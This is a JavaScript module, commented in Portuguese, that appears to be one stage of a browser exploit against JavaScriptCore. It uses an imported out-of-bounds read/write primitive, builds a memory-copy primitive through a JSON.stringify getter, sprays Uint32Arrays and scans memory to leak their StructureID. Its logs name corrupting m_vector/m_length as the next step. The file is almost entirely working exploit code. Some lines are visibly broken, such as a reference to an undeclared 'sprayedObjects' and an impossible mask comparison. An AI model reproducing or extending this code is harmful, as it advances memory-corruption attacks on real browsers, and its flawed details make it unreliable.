// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.6";

const GETTER_PROPERTY_NAME_COPY_V10_6 = "AAAA_GetterForMemoryCopy_v10_6";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100; // Onde o QWORD lido será copiado

let getter_v10_6_called_flag = false;

// !!!!! IMPORTANTE: O OBJETIVO DESTE SCRIPT É DESCOBRIR ESTE VALOR !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 34; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_6 - Validada)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_6(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_6`;
    getter_v10_6_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY_V10_6]() {
            getter_v10_6_called_flag = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_6_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5); // Pausa mínima

    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }

    if (!getter_v10_6_called_flag) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA (v10.6)
// ============================================================
async function getStructureIDFromOOB_v10_6(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy_v10_6(offset_of_jscell_in_oob);
    if (copied_qword && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) && !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) {
        return copied_qword.low(); // StructureID + Flags nos 4 bytes baixos do JSCell
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.6 - Foco na Descoberta de SID)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverStructureID_v10.6`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de StructureID de Uint32Array ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = []; // Para manter referências e evitar GC prematuro

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) {
            logS3("Falha CRÍTICA ao inicializar ambiente OOB.", "critical", FNAME_CURRENT_TEST); return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Primitiva de leitura de SID validada com ArrayBuffer no teste anterior.`, "info", FNAME_CURRENT_TEST);

        // --- PASSO PRINCIPAL: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs ---
        logS3("PASSO ATUAL: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 250; // Aumentar o spray
        const U32_SPRAY_LEN = 16; // Variar um pouco o tamanho para potencialmente mudar alocação
        sprayedU32Arrays = []; // Limpar
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN + (i % 5))); // Cria novos ArrayBuffers
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500); // Dar mais tempo para a heap assentar

        let found_sids_map = {};
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x7000, oob_array_buffer_real.byteLength - 0x20); // Escanear até ~28KB
        const SCAN_STEP_SID = 0x08; // Escanear mais densamente

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (Pode levar um tempo considerável)`, "info", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        let non_ab_sids_logged = 0;
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;

        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_6(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF) {
                // Filtrar SIDs que são claramente padrões de preenchimento ou erros
                if ((sid & 0xFFFF0000) === 0xCAFE0000 || (sid & 0xFFFF0000) === 0xBADBAD0000) {
                    continue;
                }
                // Filtrar o SID do ArrayBuffer conhecido
                if (typeof known_ab_sid === 'number' && (sid & 0xFFFFFF00) === (known_ab_sid & 0xFFFFFF00)) {
                    continue;
                }
                
                // Logar apenas SIDs "interessantes" que não foram logados muitas vezes
                if (!found_sids_map[sid] || found_sids_map[sid] < 5) { // Loga as primeiras 5 ocorrências de um novo SID
                    logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                }
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 200) === 0) { // Log de progresso
                logS3(`    Scan em ${toHex(offset)}... SIDs únicos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(10); // Pausa para não congelar UI
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (filtrados) encontrados.`, "info", FNAME_CURRENT_TEST);

        let most_frequent_sid_val = null; 
        let max_freq = 0;
        let sorted_sids = Object.keys(found_sids_map).sort((a,b) => found_sids_map[b] - found_sids_map[a]);

        logS3("  Frequência dos SIDs encontrados (top 5):", "info", FNAME_CURRENT_TEST);
        for(let i=0; i < Math.min(5, sorted_sids.length); i++) {
            const sid_val = parseInt(sorted_sids[i]);
            logS3(`    - SID: ${toHex(sid_val)}  Contagem: ${found_sids_map[sid_val]}`, "info", FNAME_CURRENT_TEST);
            if (found_sids_map[sid_val] > max_freq) {
                max_freq = found_sids_map[sid_val];
                most_frequent_sid_val = sid_val;
            }
        }
        
        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 20, 10)) { // Exigir uma frequência mínima significativa
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array suficientemente proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3("  Próximo passo: Reintegrar a lógica de corrupção de m_vector/m_length usando este SID descoberto para verificar um Uint32Array real.", "info", FNAME_CURRENT_TEST);
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
